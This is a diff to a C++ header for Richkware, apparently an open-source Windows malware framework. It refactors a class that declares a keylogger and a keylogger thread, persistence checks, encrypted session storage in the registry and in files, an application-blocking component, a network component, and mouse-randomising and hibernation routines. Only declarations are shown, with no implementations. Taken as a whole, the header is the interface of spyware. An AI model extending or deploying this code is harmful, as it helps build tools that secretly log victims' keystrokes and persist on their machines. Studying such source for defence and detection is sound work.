@@ -5,20 +5,10 @@
 #ifndef RICHKWARE_H_
 #define RICHKWARE_H_
 
-#ifndef _WIN32_WINNT
-#define _WIN32_WINNT  0x501
-#endif
-
-#define MAX_THREAD 8
-
 #include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
 #include <shellapi.h>
 #include <winbase.h>
-#include <windef.h>
-#include <winerror.h>
-#include <winnt.h>
 #include <winreg.h>
 #include <winuser.h>
 
@@ -34,26 +24,28 @@
 #include <map>
 
 #include "crypto.h"
-#include "sharedList.h"
-#include "thread.h"
 #include "blockApps.h"
+#include "network.h"
 
 class Richkware {
 private:
 	std::map<std::string, std::string> session;
-	std::string AppName;
+	std::string appName;
 
 	void SaveValueReg(const char* path, const char* key, const char* value);
 	std::string LoadValueReg(const char* path, const char* key);
 	void SaveValueToFile(const char* value, const char* path = NULL);
 	std::string LoadValueFromFile(const char* path = NULL);
 
-	void SaveSession(const char* EncryptionKey);
-	void LoadSession(const char* EncryptionKey);
-	
+	void SaveSession(const char* encryptionKey);
+	void LoadSession(const char* encryptionKey);
+
 public:
-	const char* EncryptionKey;
+	const char* encryptionKey;
 	BlockApps blockApps;
+	Network network;
+
+	Richkware(const char* AppNameArg, const char* EncryptionKeyArg);
 
 	void SaveInfo(const char* key, const char* value);
 	std::string FindInfo(const char* key);
@@ -67,14 +59,12 @@ public:
 	void Keylogger(const char* fileName);
 	bool CheckSession();
 	bool CheckPersistance();
-	void Initialize(const char* AppName, const char* EncryptionKey);
-
-	int StartServer(const char* port, const char* EncryptionKey = NULL);
-	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
 	
 	void Hibernation();
 	void RandMouse();
 
 };
+
+DWORD WINAPI KeyloggerThread(void* arg);
 
 #endif /* RICHKWARE_H_ */
